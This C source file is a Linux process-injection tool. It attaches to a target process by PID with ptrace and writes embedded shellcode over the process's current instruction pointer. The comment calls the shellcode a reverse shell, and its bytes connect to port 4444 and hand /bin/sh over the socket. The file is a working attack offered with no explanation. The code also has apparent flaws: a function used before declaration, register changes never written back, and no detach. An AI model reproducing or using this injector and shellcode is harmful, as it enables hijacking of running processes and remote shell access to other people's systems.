#include <stdio.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>


// code reverse shell RevShellLinux.nasm
unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x48\x31\xff\x48\x89\xfa\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xc0\x48\x83\xc0\x29\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\x48\x89\xe6\xba\x10\x00\x00\x00\x48\x83\xc0\x2a\x0f\x05\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x40\xb6\x01\xb0\x21\x0f\x05\x40\xb6\x02\xb0\x21\x0f\x05\x48\x31\xff\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";


int main(int argc, char *argv[])
{
	int pid=atoi(argv[1]);

	pid_t target = pid;

	if((ptrace(PTRACE_ATTACH, target, NULL, NULL))<0)
	{
		perror("ptrace(PTRACE_ATTACH)");
		return -1;
	}

	printf("Wait for process...\n");
	wait(NULL);


	struct user_regs_struct regs;
	if((ptrace(PTRACE_GETREGS, target, NULL, &regs))<0)
	{
		perror("ptrace(PTRACE_GETREGS)");
		return -1;
	}

	printf("Code injection...\n");
	inject_code(target, code, (void*)regs.rip, sizeof(code));
	regs.rip+=2;
}


int inject_code(pid_t pid, unsigned char *src, void *dst, int len)
{
	int i;
	uint32_t *s = (uint32_t*) src;
	uint32_t *d = (uint32_t*) dst;

	for(i=0; i<len; i+=4, s++, d++)
	{
		if((ptrace(PTRACE_POKETEXT, pid, d, *s))<0)
		{
			perror("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}
	return 0;
}
